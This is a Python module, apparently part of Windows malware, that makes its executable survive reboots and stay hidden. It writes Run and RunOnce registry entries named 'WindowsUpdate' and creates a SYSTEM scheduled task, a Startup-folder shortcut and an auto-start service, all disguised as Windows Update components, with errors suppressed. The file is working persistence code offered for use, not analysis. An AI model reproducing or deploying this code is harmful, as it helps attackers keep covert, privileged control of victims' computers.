"""
Persistence Module
Maintains presence on the system
"""

import os
import sys
import winreg
import subprocess
import logging
import time

class PersistenceMechanisms:
    def __init__(self):
        self.registry_keys = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
        ]
        
        self.task_name = "WindowsSystemUpdate"
        
        logging.info("[*] Persistence Mechanisms initialized")
    
    def install(self):
        """Install all persistence mechanisms"""
        methods = [
            self._registry_persistence,
            self._scheduled_task_persistence,
            self._startup_folder_persistence,
            self._service_persistence
        ]
        
        for method in methods:
            try:
                method()
            except Exception as e:
                logging.error(f"Persistence method {method.__name__} failed: {e}")
        
        logging.info("[✓] Persistence installed")
    
    def _registry_persistence(self):
        """Add to Windows Registry"""
        for key_path in self.registry_keys:
            try:
                # Try HKCU first
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    key_path,
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(
                    key,
                    'WindowsUpdate',
                    0,
                    winreg.REG_SZ,
                    sys.executable
                )
                winreg.CloseKey(key)
                return
            except:
                # Try HKLM if HKCU fails
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        key_path,
                        0,
                        winreg.KEY_SET_VALUE
                    )
                    winreg.SetValueEx(
                        key,
                        'WindowsUpdate',
                        0,
                        winreg.REG_SZ,
                        sys.executable
                    )
                    winreg.CloseKey(key)
                    return
                except:
                    continue
        
        logging.info("[✓] Registry persistence added")
    
    def _scheduled_task_persistence(self):
        """Create scheduled task"""
        try:
            command = f"""
            schtasks /create /tn "{self.task_name}" /tr "{sys.executable}" /sc onstart /ru SYSTEM /f
            """
            subprocess.run(command, capture_output=True, shell=True)
            logging.info("[✓] Scheduled task created")
        except:
            pass
    
    def _startup_folder_persistence(self):
        """Add to startup folder"""
        try:
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            
            shortcut_path = os.path.join(startup_path, 'SystemUpdate.lnk')
            
            # Create shortcut using PowerShell
            ps_command = f"""
            $WScriptShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WScriptShell.CreateShortcut('{shortcut_path}')
            $Shortcut.TargetPath = '{sys.executable}'
            $Shortcut.Save()
            """
            subprocess.run(['powershell', '-Command', ps_command], capture_output=True)
            logging.info("[✓] Startup folder persistence added")
        except:
            pass
    
    def _service_persistence(self):
        """Create Windows service"""
        try:
            service_name = "WindowsUpdateService"
            command = f"""
            sc create {service_name} binPath= "{sys.executable}" start= auto
            sc description {service_name} "Windows Update Service"
            sc start {service_name}
            """
            subprocess.run(command, capture_output=True, shell=True)
            logging.info("[✓] Service persistence added")
        except:
            pass